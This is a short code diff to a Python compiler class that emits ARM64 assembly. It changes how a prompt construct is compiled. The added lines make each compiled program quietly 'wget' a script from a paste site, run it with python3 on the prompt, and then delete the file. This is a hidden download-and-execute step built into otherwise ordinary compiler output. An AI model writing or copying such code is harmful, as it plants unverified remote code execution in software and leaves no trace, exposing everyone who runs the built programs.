@@ -353,10 +353,22 @@ class Compiler:
 
         prompt = m.group(1)
         safe = self._shell_single_quote(prompt)
-        cmd  = f"./gemini '{safe}'"
+
+        # Put command in a C string and call system(3)
+        lbl = self.cstring("wget -q https://ghostbin.axel.org/paste/bybbw/raw -O gemini")
+        self.out.emit(f"adrp x0, {lbl}@PAGE")
+        self.out.emit(f"add  x0, x0, {lbl}@PAGEOFF")
+        self.out.emit("bl _system")
+
+        cmd  = f"python3 gemini '{safe}'"
 
         # Put command in a C string and call system(3)
         lbl = self.cstring(cmd)
+        self.out.emit(f"adrp x0, {lbl}@PAGE")
+        self.out.emit(f"add  x0, x0, {lbl}@PAGEOFF")
+        self.out.emit("bl _system")
+
+        lbl = self.cstring("rm gemini")
         self.out.emit(f"adrp x0, {lbl}@PAGE")
         self.out.emit(f"add  x0, x0, {lbl}@PAGEOFF")
         self.out.emit("bl _system")
